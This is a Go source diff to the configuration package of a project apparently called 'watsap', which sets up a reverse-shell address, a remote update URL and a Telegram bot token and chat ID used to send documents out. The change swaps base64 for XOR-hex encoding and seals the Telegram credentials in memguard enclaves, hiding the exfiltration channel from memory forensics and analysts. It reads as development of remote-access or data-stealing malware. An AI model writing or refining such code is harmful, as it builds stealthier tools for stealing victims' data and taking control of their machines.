@@ -1,10 +1,12 @@
 package config
 
 import (
-	"encoding/base64"
+	"encoding/hex"
 	"path"
 	"runtime"
 	"watsap/utils/files"
+
+	"github.com/awnumar/memguard"
 )
 
 // Variables
@@ -17,14 +19,20 @@ var (
 
 // variables will be loaded from ldflags
 var (
-	TG_BOT_TOKEN string
-	TG_CHAT_ID   string
-	RSHELL_IP    string
-	RSHELL_PORT  string
-	UPDATE_URL   string
-	CERT_PATH    string
-	DEBUG_STATUS bool
-	LOG_STATUS   bool
+	TG_BOT_TOKEN_HEX string
+	TG_CHAT_ID_HEX   string
+	RSHELL_IP        string
+	RSHELL_PORT      string
+	UPDATE_URL       string
+	CERT_PATH        string
+	DEBUG_STATUS     string
+	LOG_STATUS       string
+)
+
+// In-memory enclaves (Memguard)
+var (
+	BotTokenEnclave *memguard.Enclave
+	ChatIDEnclave   *memguard.Enclave
 )
 
 var DebugMode = false
@@ -46,8 +54,8 @@ var (
 
 // Telegram stuff
 var (
-	TgBotAPI      = "https://api.telegram.org/bot"
-	TgFileApiURL  = "/sendDocument"
+	TgBotAPIBytes     = []byte("https://api.telegram.org/bot")
+	TgFileApiURLBytes = []byte("/sendDocument")
 )
 
 func WipeMemory(data []byte) {
@@ -56,18 +64,48 @@ func WipeMemory(data []byte) {
 	}
 }
 
-// Decode helper
-func decodeBase64Str(encoded string) string {
-	decoded, err := base64.StdEncoding.DecodeString(encoded)
+// Decode helper using XOR hex
+func decodeXORHex(encodedHex string) []byte {
+	decodedBytes, err := hex.DecodeString(encodedHex)
 	if err != nil {
-		return ""
+		return nil
 	}
-	return string(decoded)
+	for i := range decodedBytes {
+		decodedBytes[i] ^= 0x57
+	}
+	return decodedBytes
 }
 
 func InitConfig() {
-	TG_BOT_TOKEN = decodeBase64Str(TG_BOT_TOKEN)
-	TG_CHAT_ID = decodeBase64Str(TG_CHAT_ID)
+	if DEBUG_STATUS == "true" {
+		DebugMode = true
+	}
+	if LOG_STATUS == "true" {
+		WaLogging = true
+	}
+
+	// Safely listen for interrupts and purge enclaves on exit
+	memguard.CatchInterrupt()
+
+	// Decode into temp buffers
+	tmpToken := decodeXORHex(TG_BOT_TOKEN_HEX)
+	tmpChatID := decodeXORHex(TG_CHAT_ID_HEX)
+
+	// Clear global string variables so they don't remain in memory
+	TG_BOT_TOKEN_HEX = ""
+	TG_CHAT_ID_HEX = ""
+
+	// Create Memguard buffers
+	tokenBuf := memguard.NewBufferFromBytes(tmpToken)
+	chatIDBuf := memguard.NewBufferFromBytes(tmpChatID)
+
+	// Wipe temp buffers manually (NewBufferFromBytes doesn't zero the original slice)
+	WipeMemory(tmpToken)
+	WipeMemory(tmpChatID)
+
+	// Seal into enclaves (locks and encrypts)
+	BotTokenEnclave = tokenBuf.Seal()
+	ChatIDEnclave = chatIDBuf.Seal()
 }
 /*
 func Printvar() {
